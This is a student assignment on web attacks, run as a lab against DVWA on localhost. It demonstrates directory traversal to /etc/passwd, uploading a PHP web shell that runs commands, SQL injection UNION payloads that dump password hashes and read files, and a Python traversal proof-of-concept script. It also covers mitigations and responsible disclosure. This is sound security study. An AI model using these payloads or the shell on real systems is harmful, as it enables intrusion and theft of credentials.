
$$
\huge \begin{array}{c} \mathbf{\textsf{Royal University of Bhutan,}} \\ \mathbf{\textsf{College of Science and Technology}} \end{array}
$$

$$
\Large \mathbf{\textsf{SWS304: Advanced Web Attacks and Exploitation  }}
$$

$$
\Large \mathbf{\textsf{Computing Technologies Department  }}
$$

$$
\large \mathbf{\textsf{Assignment 2  }}
$$

$$
\large \mathbf{\textsf{Submitted by: Sonam Dorji Ghalley  }}
$$

$$
\large \mathbf{\textsf{Student No: 02230299  }}
$$

## **1. Introduction**

The assignment studies actual web security weaknesses which include attacks on file systems and database extension exploitation and advanced vulnerability discovery methods. The research aims to identify security weaknesses which attackers use to exploit programming faults while demonstrating how secure development and configuration methods can protect against those weaknesses.

### Question 1: File System Attacks

#### Part A - Directory Traversal

**(i) What is Directory Traversal?**

Directory Traversal exists as a security flaw which enables hackers to retrieve files from directories that the system should protect against access through their manipulation of file path inputs. The system becomes vulnerable to this attack method when user input lacks sufficient validation before it proceeds to file processing operations. Hackers use the `../` sequence to climb up directory structures and gain unauthorized access to restricted system files. The method poses a risk because it enables the exposure of secret information which includes system configuration files and user authentication details.

**(ii) Analyze the Vulnerable Code Below**

```php
<?php
$file = $
GET['file'];
_
include('/var/www/html/pages/' . $file);
?>
Usage: http://testsite.local/view.php?file=about.html
```

**Payload used:**

```php
 ../../../../etc/passwd
```

**Resolved Path:**

```php
/var/www/html/pages/../../../../etc/passwd
→ /etc/passwd
```

The attacker is trying to gain access to the Linux system's user account information file located at `/etc/passwd`. The file discloses usernames together with system details which can be used for further attacks such as privilege escalation or brute-force login attempts.

**(iii) Suggest TWO Specific Fixes** 

Fix 1: Whitelisting files

```php
$allowed = ['about.html', 'contact.html'];
if (in_array($file, $allowed)) {
    include('/var/www/html/pages/' . $file);
}
```

- **NOTE:** A whitelist file is a cybersecurity mechanism that explicitly lists trusted, permitted applications, software, or file types (e.g., `.exe`, `.dll`, `.scr`) allowed to run on a system, while blocking all unauthorized, unlisted items by default.

this only allows predefined safe files.

Fix 2: Use basename()

```php
$file = basename($_GET['file']);
include('/var/www/html/pages/' . $file);
```

- **NOTE:** The `basename()` function extracts the final component of a file path, effectively stripping directory paths to return just the filename or last directory name.

This prevents directory traversal by removing path components.

#### **Part B - File Inclusion & File Upload Vulnerabilities**

**(i) LFI vs RFI**

- LFI (Local File Inclusion) enables attackers to access server files through their local server files. Example: The attacker uses the path `/etc/passwd` to gain access to confidential information.
- RFI (Remote File Inclusion) enables web applications to load files which are stored on remote servers. The attacker uses a remote URL to load a dangerous PHP script which executes his malicious code.

**(ii) Practical Task - File Upload Exploitation**

Starting the apache server 

![image.png](Assignment%202/image.png)

than going to the url `http://localhost` and if apache is started successfully we will see the following

![image.png](Assignment%202/image%201.png)

Going to the endpoint `http://localhost/dvwa` where we will required to log in with the default username and password `admin`  and `password`

![image.png](Assignment%202/image%202.png)

![image.png](Assignment%202/image%203.png)

after logging we will directed to the page above and after we need to the DVWA security section on the left hand side panel and se the security to low 

![image.png](Assignment%202/image%204.png)

going back to the terminal and writing the following script 

```php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

![image.png](Assignment%202/image%205.png)

Upload shell.php via DVWA

![image.png](Assignment%202/image%206.png)

after uploading we will see the success us:

![image.png](Assignment%202/image%207.png)

In your browser, navigate to `http://localhost/dvwa/hackable/uploads/shell.php?cmd=whoami`

![image.png](Assignment%202/image%208.png)

**(iii) TWO Upload Mitigations** 

1.  File type validation
    - Only allow specific extensions (e.g., .jpg, .png)
    - Prevents uploading executable scripts
    
2. Store files outside web root
    - Uploaded files cannot be executed via browser
    - Reduces risk of remote code execution

### **Question 2: Database Extensions and Security**

#### **Part A - Understanding and Exploiting Database Extensions**

**(i) What Are Database Extensions ?**

Database extensions function as extra features which enhance the operational capabilities of database systems which include MySQL and PostgreSQL. The system allows users to create custom functions while using file operations and OS command execution features. The system  becomes a security threat because attackers can use its design flaws to run system commands and obtain protected information.

**(ii) Practical Task - Exploiting a Vulnerable Extension**

Since DVWA has only SQL injection attack which is also a part of vulnerable database extension going back to DVWA, we now move to SQL inject to perform this attack simulation 

![image.png](Assignment%202/image%209.png)

after we submit the query we get the following 

![image.png](Assignment%202/image%2010.png)

**Simulating OS Command Access via MySQL Functions in DVWA**

When an attacker gains SQL Injection access, they're not limited to just reading database tables. MySQL provides powerful functions that can interact with the server's file system, ****this turns a database vulnerability into an operating system compromise.

first lets check how many number of columns are there using 

```sql
1' UNION SELECT 1,2 #
```

![image.png](Assignment%202/image%2011.png)

Now replace the number with the `LOAD_FILE()` function:

```sql
1' UNION SELECT LOAD_FILE('/etc/passwd'), 2 #
```

![image.png](Assignment%202/image%2012.png)

**(iii) Post-Exploitation Pivot**

The attacker who gains database access will extract stored credentials from the database. The credentials which were obtained through these criminal activities will be used by him to access system login and admin panel access. The attacker can also create backdoors or escalate privileges by modifying user roles. The attacker who obtains stolen credentials can access different services to move laterally within the system.

#### **Part B - Securing Database Configurations**

**(i) FOUR Mitigation Strategies**

1. **Disable Dangerous Functions**

Database systems often include built-in functions that interact with the operating system or file system. MySQL provides the function `LOAD_FILE()` which enables file reading from the server under specific system settings while users can execute system commands through User Defined Functions (UDFs). The attacker who achieves SQL injection access can use the functions to access protected files such as /etc/passwd and to run operating system commands.
Administrators need to stop or limit database functions through their database settings to decrease this security threat. The `secure_file_priv` setting in MySQL limits file access to specific directories which prevents unauthorized file operations. Production environments should not use UDFs that execute commands except for situations which require their use. The process decreases the number of potential attack paths which stops attackers from gaining complete system control by first accessing the database.

1. **Apply the Principle of Least Privilege**

The principle of least privilege means that database users should only be given the minimum permissions required to perform their tasks. A web application user should typically only have `SELECT, INSERT, UPDATE`, and `DELETE` permissions according to standard practice and should not have access to administrative privileges like `FILE, SUPER, or EXECUTE.`

The attacker can execute dangerous actions after breaking into the application through SQL injection because they received excessive access rights. The attacker faces major obstacles to successful attacks because security teams can use their restricted access to monitor system activities. The security control provides the best protection for databases according to experts who consider it the most effective security measure.

1. **Regular Patching and Updates**

Database systems and their extensions receive security updates to address newly discovered vulnerabilities which need protection through security patches. The use of outdated MySQL and PostgreSQL versions creates a situation where attackers can exploit known security vulnerabilities through public tools which they can access.

The practice of routine patching security updates enables immediate resolution of security vulnerabilities while decreasing risk from existing threats. The process requires updating both the database engine and all installed extensions and associated components. Organizations need to implement a complete patch management system which requires them to test all updates in a staging environment before they can deploy updates to their production systems. Database security needs system updates because they help create a safe database environment.

1. **Restrict Remote Access to the Database**

The default security setting for databases establishes that all external network connections must be denied access to database systems. Remote access enables attackers to perform three types of attacks which include brute-force attempts and vulnerability exploitation and direct service attacks through uncontrolled access.

The database access must be limited to trusted IP addresses through firewall rules and network-level controls to decrease this risk. The database service binding to localhost (127.0.0.1) system restricts application access to local programs only. The establishment of remote access requires the implementation of secure methods which include VPNs and SSH tunneling as mandatory protection measures. The setup allows two security advantages because it protects all resources while blocking all unauthorized attempts to access the database server.

**(ii) Professional Security Report**

The database configuration contained a serious security flaw because it permitted execution of system commands through unsafe functions. This vulnerability enables unauthorized users to access the system and steal sensitive information. The organization needs to disable these functions and limit user access while conducting a complete system investigation to find any security breaches.

### **Question 3: Advanced Vulnerability Discovery**

#### **Part A — Code Analysis for Complex Vulnerabilities**

**(i) Static Code Analysis**

```php
<?php
	session start();
	
	$userId = $_GET['id'];
	
	$preview = $_GET['file'];
	
	// Fetch user record
	$query = "SELECT * FROM users WHERE id = " . $userId;
	$result = mysqli_query($conn, $query);
	$user = mysqli_fetch_assoc($result);
	
	
	// Display requested file preview
	if ($user['role'] === 'admin') {
		echo file_get_contents('/var/www/previews/'. $preview);
		}
?>
```

1. In the line below the system takes the user input for the `$userId` parameter directly from `$_GET['id']` and adds it to the SQL query without any sanitization or parameterization. An attacker can inject malicious SQL (e.g., 1 OR 1=1) to manipulate the query, bypass authentication, or extract database data.
    
    ```php
    $query = "SELECT * FROM users WHERE id = " . $userId;
    ```
    
2. In the line below the application allows users to directly control the `id` parameter without any authorization check. An attacker can change the `id` value which enables access to records belonging to different users and this method allows the attacker to obtain sensitive data including admin account information. this is know as Insecure Direct Object Reference (IDOR)
    
    ```php
    $userId = $_GET['id'];
    ```
    
3. in the line below the `$preview` parameter is user-controlled and directly used in a file path. An attacker can add input like `../../../../etc/passwd` to traverse directories and read sensitive files outside the intended folder.
    
    ```php
    echo file_get_contents('/var/www/previews/' . $preview);
    ```
    
4. The application trusts the database result without verifying if the requester is actually authenticated as that user. An attacker can use SQL injection to alter the query so it fetches an admin record which allows them to evade security barriers. which may even lead to privilege escalation.
    
    ```php
    if ($user['role'] === 'admin')
    ```
    

**(ii) Why Complex Vulnerabilities Are Hard**

The automatic detection process becomes difficult because complex vulnerabilities need multiple steps which require specific logical conditions to be fulfilled. The automated scanners typically detect basic SQL injection patterns but they fail to identify attacks which involve multiple attack steps. Manual analysis is more effective because it considers application logic and context. The combination of multiple vulnerabilities which separately seem harmless creates a dangerous situation.

#### **Part B - Chaining Multiple Vulnerabilities**

**(i) Build an Attack Chain**

**Phase 1: SQL Injection**

The goal here is to bypass login or extract the admin password hash directly from the database.

In the DVWA going back to SQL injection and entering the command below 

```sql
1' ORDER BY 2#
```

![image.png](Assignment%202/image%2013.png)

This will find the number of columns and we can see that there atleast 2 present 

now extracting the username and password with the payload below 

```sql
1' UNION SELECT user, password FROM users#
```

![image.png](Assignment%202/image%2014.png)

we can see the passwords are displayed in MD5 hashes  and using online MD5 decryption tool we can see the following:

![image.png](Assignment%202/image%2015.png)

**Phase 2: File Inclusion (Reading /etc/passwd)**

now that we the admin credential we do directory traversal using DVWA 

so to proceed with this we first go to file inclusion in DVWA 

![image.png](Assignment%202/image%2016.png)

after that we choose one of the file and look at the url 

![image.png](Assignment%202/image%2017.png)

after this in the url we can change or modify the url ad follows 

[http://localhost/dvwa/vulnerabilities/fi/?page=../../../../../../../etc/passwd](http://localhost/dvwa/vulnerabilities/fi/?page=../../../../../../../etc/passwd)

here we are doing path traversal to get to the passwords  and when we enter the url we get the output 

![image.png](Assignment%202/image%2018.png)

so if i break down what each line says 

```sql
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:101:102:MariaDB Server:/nonexistent:/bin/false
sshd:x:988:65534:sshd user:/run/sshd:/usr/sbin/nologin
postgres:x:117:120:PostgreSQL administrator:/var/lib/postgresql:/bin/bash
```

if we take this line as an example than 

```sql
root:x:0:0:root:/root:/usr/bin/zsh
```

| **Field** | **Value** | **Meaning** |
| --- | --- | --- |
| Username | `root` | The user name |
| Password | `x` | Password hash is stored in `/etc/shadow` (not visible here) |
| UID | `0` | User ID (0 = superuser) |
| GID | `0` | Group ID |
| Comment | `root` | Full name / description |
| Home directory | `/root` | Where the user's files go |
| Shell | `/usr/bin/zsh` | Login shell (here: Zsh instead of Bash) |

from here what we can know is that 

we have bypassed file system restrictions

- The `?file=../../../../etc/passwd` payload traversed outside the web root.

Read a sensitive system file

- `/etc/passwd` normally **should not be accessible** to a web user.

Information disclosure

- 
- Which users exist on the system (`root`, `mysql`, `postgres`, `sshd`, etc.)
- Which services are installed (`mysql`, `postgresql`, `redis`, `mosquitto`)
- That some users have login shells (`/bin/bash`, `/usr/bin/zsh`), meaning we can have potential login access

**(ii) Why Chaining is Dangerous**

Chaining vulnerabilities increases impact because multiple weaknesses amplify each other. A low-risk vulnerability can become critical when combined with another flaw. The automated scanners are unable to find these relationships which results in people underestimating the associated risks.

#### **Part C - Creating Proof-of-Concept Exploits**

**(i) Write a PoC Exploit Script**

```python
import requests

target = input("Enter target URL: ")

payload = "?file=../../../../etc/passwd"

url = target + payload

response = requests.get(url)

print("Response:\n")
print(response.text)
```

after running this python PoC script we will see we will see the following in the terminal output

![image.png](Assignment%202/image%2019.png)

where this sends a directory traversal payload and prints the output. we can see the user token for login 

**(ii) PoC Ethics and Scope**

The use of PoC exploits requires operators to perform testing in designated secure areas which receive official authorization. The practice of testing without permission leads to both operational harm and legal violations. Penetration testers must follow scope and ensure no disruption to systems.

#### **Part D - Responsible Disclosure Practices**

**(i) The Responsible Disclosure Process**

The researcher must start their reporting process by notifying the software owner about the discovered vulnerability. The report requires an explanation of the problem together with instructions for reproducing the issue and an assessment of its effects. The researcher then gives the company time (usually around 90 days) to fix the problem. The two parties will use this period to exchange information while they evaluate the implementation of the solution. The vulnerability becomes eligible for public disclosure after the issue has been resolved, which usually occurs through tracking with a CVE number.

**(ii) Full Disclosure vs. Coordinated Disclosure**

**Full disclosure** means the researcher makes the vulnerability public immediately, even if no fix is available.

**Coordinated disclosure** means the researcher waits and works with the company before making it public.

Full disclosure may be used if the company ignores the issue for a long time. However, it is risky because attackers can exploit the vulnerability before it is fixed. To reduce harm, the researcher should avoid sharing full exploit details and provide basic mitigation steps.

### Conclusion

The assignment showed the methods which attackers use to exploit web security flaws and the ways which organizations can protect themselves from these attacks. The demonstration of directory traversal attacks and file upload exploitation and SQL injection attacks requires developers to learn secure coding methods. The security console of web applications requires developers to understand these concepts because they need to create programs which protect against actual security threats.